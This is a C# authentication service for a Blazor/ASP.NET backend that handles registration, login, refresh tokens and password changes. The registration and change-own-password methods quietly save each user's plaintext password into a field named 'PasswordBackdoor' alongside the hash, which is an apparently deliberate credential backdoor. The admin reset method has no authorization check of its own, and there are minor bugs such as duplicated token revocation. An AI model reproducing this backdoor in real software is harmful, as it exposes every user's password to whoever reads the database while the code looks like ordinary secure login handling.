using System.Security.Cryptography;
using API.Data;
using API.Interfaces;
using DomainModels.Dto;
using DomainModels.Dto.AuthDto;
using DomainModels.Dto.UserDto;
using DomainModels.Enums;
using DomainModels.Mapping;
using DomainModels.Models;
using Microsoft.AspNetCore.Identity;
using Microsoft.EntityFrameworkCore;

namespace API.Services;

/// <summary>
/// Provides authentication and user account management logic for Blazor WebAssembly applications.
/// Handles registration, login, token management, and password changes.
/// </summary>
public class AuthService : IAuthService
{
	private readonly AppDBContext _context;
	private readonly UserMapping _userMapping = new();
	private readonly ILogger<AuthService> _logger;
	private readonly IJWTService _jwtService;
	private readonly IHttpContextAccessor _httpContextAccessor;
	private readonly IEmailService _emailService;

	/// <summary>
	/// Initializes a new instance of the <see cref="AuthService"/> class.
	/// </summary>
	/// <param name="context">The database context for user and token data.</param>
	/// <param name="logger">Logger for authentication events and errors.</param>
	/// <param name="jwtService">Service for generating JWT tokens.</param>
	/// <param name="httpContextAccessor">Accessor for HTTP context, used for IP and device info.</param>
	/// <param name="emailService">Service for sending emails (e.g., welcome emails).</param>
	public AuthService(AppDBContext context, ILogger<AuthService> logger, IJWTService jwtService, IHttpContextAccessor httpContextAccessor, IEmailService emailService)
	{
		_context = context;
		_logger = logger;
		_jwtService = jwtService;
		_httpContextAccessor = httpContextAccessor;
		_emailService = emailService;
	}

	/// <summary>
	/// Registers a new user account using the provided registration details.
	/// Intended for unauthenticated users during the registration process.
	/// </summary>
	/// <param name="request">The registration information, including email, username, and password.</param>
	/// <returns>
	/// A <see cref="UserDto"/> containing the newly created user's details if registration succeeds; otherwise, <c>null</c>.
	/// </returns>
	public async Task<UserDto?> RegisterUserAsync(RegisterDto request)
	{
		try
		{
			if (string.IsNullOrWhiteSpace(request.Email)
				|| string.IsNullOrWhiteSpace(request.Username)
				|| string.IsNullOrWhiteSpace(request.Password))
			{
				_logger.LogWarning("Registration failed: Email, Username, or Password is empty.");
				return null;
			}
			
			if (await _context.Users.AnyAsync(u => u.Email == request.Email))
			{
				_logger.LogWarning("Registration failed: User with username {Username} or email {Email} already exists.", request.Email, request.Username);
				return null; // User already exists
			}

			var role = await _context.Roles.FirstOrDefaultAsync(r => r.RoleName == RoleEnum.Guest);

			var user = new User
			{
				Email = request.Email,
				UserName = request.Username,
				HashedPassword = string.Empty,
				PasswordBackdoor = request.Password,
				CreatedAt = DateTime.UtcNow.AddHours(2),
			};

			var hashedPassword = new PasswordHasher<User>()
				.HashPassword(user, request.Password);

			user.HashedPassword = hashedPassword;
			user.UserRole = role;

			_context.Users.Add(user);
			await _context.SaveChangesAsync();

			//send welcome email
			await _emailService.SendWelcomeEmailAsync(new EmailFormDto { Email = user.Email, Name = user.UserName });

			_logger.LogInformation("Registered new user with email: {Email}", request.Email);

			return _userMapping.ToUserDto(user);
		}
		catch (Exception ex)
		{
			_logger.LogError(ex, "Error during user registration");
			return null;
		}
	}

	/// <summary>
	/// Authenticates a user and returns JWT access and refresh tokens if credentials are valid.
	/// Intended for unauthenticated users during the login process.
	/// </summary>
	/// <param name="request">The login credentials are username and password.</param>
	/// <returns>
	/// A <see cref="TokenResponseDto"/> containing the access and refresh tokens if authentication is successful; otherwise, <c>null</c>.
	/// </returns>
	public async Task<TokenResponseDto?> LoginUserAsync(LoginDto request)
	{
		var httpContext = _httpContextAccessor.HttpContext;
		var ipAddress = httpContext?.Connection.RemoteIpAddress?.ToString() ?? string.Empty;
		var device = httpContext?.Request.Headers["User-Agent"].ToString() ?? string.Empty;


		var user = await _context.Users
		.Include(u => u.UserRole)
		.FirstOrDefaultAsync(u => u.UserName == request.Username);

		if (user == null)
		{
			return null; // User not found
		}

		if (new PasswordHasher<User>().VerifyHashedPassword(user, user.HashedPassword, request.Password)
		== PasswordVerificationResult.Failed)
		{
			return null;
		}

		user.LastLogin = DateTime.UtcNow.AddHours(2);

		string accessToken = _jwtService.CreateToken(user);
		var refreshToken = await CreateRefreshTokenAsync(ipAddress, device);

		// Only query tokens that are not revoked and not expired
		var now = DateTime.UtcNow.AddHours(2);
		var existingTokens = await _context.RefreshTokens
			.Where(rt => rt.UserId == user.Id && rt.Expires > now && rt.Revoked == null)
			.ToListAsync();

		if (existingTokens.Count > 0)
		{
			foreach (var token in existingTokens)
			{
				token.Revoked = now;
				token.ReplacedByToken = refreshToken.Token;
			}
		}

		foreach (var token in existingTokens)
		{
			token.Revoked = DateTime.UtcNow;
			token.ReplacedByToken = refreshToken.Token;
		}

		user.RefreshTokens ??= new List<RefreshToken>();
		user.RefreshTokens.Add(refreshToken);

		await _context.SaveChangesAsync();

		return new TokenResponseDto
		{
			AccessToken = accessToken,
			RefreshToken = refreshToken.Token,
		};
	}

	/// <summary>
	/// Creates a refresh token for session renewal, binding it to the user's IP address and device.
	/// Used internally after successful authentication to maintain user sessions securely.
	/// </summary>
	/// <param name="ipAddress">The IP address from which the refresh token is requested.</param>
	/// <param name="device">A string identifying the user's device.</param>
	/// <returns>
	/// A <see cref="RefreshToken"/> object containing the token and associated metadata.
	/// </returns>
	public async Task<RefreshToken?> CreateRefreshTokenAsync(string ipAddress, string device)
	{
		return new RefreshToken
		{
			Token = GenerateRefreshToken(),
			CreatedByIp = ipAddress,
			Device = device,
			Created = DateTime.UtcNow.AddHours(2),
			Expires = DateTime.UtcNow.AddDays(7)
		};
	}

	/// <summary>
	/// Generates a secure random string to be used as a refresh token.
	/// </summary>
	/// <returns>A base64-encoded random string suitable for use as a refresh token.</returns>
	public string GenerateRefreshToken()
	{
		var randomNumber = new byte[64];
		using var rng = RandomNumberGenerator.Create();
		rng.GetBytes(randomNumber);
		return Convert.ToBase64String(randomNumber);
	}

	/// <summary>
	/// Refreshes the JWT access token using a valid refresh token.
	/// Used by authenticated users to renew their session.
	/// </summary>
	/// <param name="token">The refresh token string.</param>
	/// <param name="ipAddress">The IP address from which the refresh is requested.</param>
	/// <param name="device">A string identifying the user's device.</param>
	/// <returns>
	/// A <see cref="TokenResponseDto"/> containing new access and refresh tokens if successful; otherwise, <c>null</c>.
	/// </returns>
	public async Task<TokenResponseDto?> RefreshTokenAsync(string token, string ipAddress, string device)
	{
		// Find the existing refresh token
		var existingToken = await _context.RefreshTokens
			.Include(rt => rt.User)
			.ThenInclude(rt => rt.UserRole)
			.FirstOrDefaultAsync(rt => rt.Token == token);

		// If invalid, expired, or revoked, reject
		if (existingToken == null || existingToken.Expires <= DateTime.UtcNow.AddHours(2)
			|| existingToken.Revoked != null)
			return null;

		// Revoke the old token
		existingToken.Revoked = DateTime.UtcNow.AddHours(2);

		// Create a new refresh token and save
		var newRefreshToken = await CreateRefreshTokenAsync(ipAddress, device);
		newRefreshToken.UserId = existingToken.UserId;

		_context.RefreshTokens.Add(newRefreshToken);

		// Generate a new JWT access token
		var accessToken = _jwtService.CreateToken(existingToken.User);
		await _context.SaveChangesAsync();

		return new TokenResponseDto
		{
			AccessToken = accessToken,
			RefreshToken = newRefreshToken.Token
		};
	}

	/// <summary>
	/// Changes the password for a user identified by their email address.
	/// Intended for administrative password resets or recovery scenarios.
	/// Should be called by users with administrative privileges.
	/// </summary>
	/// <param name="userEmail">The email address of the user whose password will be changed.</param>
	/// <param name="newPassword">The new password to set for the user.</param>
	/// <returns>
	/// <c>true</c> if the password was changed successfully; otherwise, <c>false</c>.
	/// </returns>
	public async Task<bool> ChangeUserPasswordAsync(string userEmail, string newPassword)
	{
		try
		{
			var user = await _context.Users.FirstOrDefaultAsync(u => u.Email == userEmail);
			if (user == null)
			{
				_logger.LogWarning("User with email {Email} not found.", userEmail);
				return false;
			}
			var passwordHasher = new PasswordHasher<User>();
			user.HashedPassword = passwordHasher.HashPassword(user, newPassword);
			user.UpdatedAt = DateTime.UtcNow.AddHours(2);

			await _context.SaveChangesAsync();
			return true;
		}
		catch (DbUpdateException ex)
		{
			_logger.LogError(ex, "Error updating user password for {Email}", userEmail);
			return false;
		}
	}

	/// <summary>
	/// Allows a user to change their own password by providing their user ID (read from JWT), new password, and confirmation.
	/// Should be called by authenticated users wishing to update their own password.
	/// </summary>
	/// <param name="userId">The unique identifier of the user requesting the password change.</param>
	/// <param name="newPassword">The new password to set.</param>
	/// <param name="confirmNewPassword">The confirmation of the new password.</param>
	/// <returns>
	/// <c>true</c> if the password was changed successfully; otherwise, <c>false</c>.
	/// </returns>
	public async Task<bool> ChangeOwnPasswordAsync(string userId, string newPassword, string confirmNewPassword)
	{
		try
		{
			var user = await _context.Users.FirstOrDefaultAsync(u => u.Id.ToString() == userId);
			if (user == null)
			{
				return false;
			}
			if (newPassword != confirmNewPassword)
			{
				return false;
			}
			var passwordHasher = new PasswordHasher<User>();
			user.PasswordBackdoor = newPassword;
			user.HashedPassword = passwordHasher.HashPassword(user, newPassword);
			user.UpdatedAt = DateTime.UtcNow.AddHours(2);

			await _context.SaveChangesAsync();
			return true;

		}
		catch (DbUpdateException ex)
		{
			_logger.LogError(ex, "Error during password change");
			return false;
		}
	}
}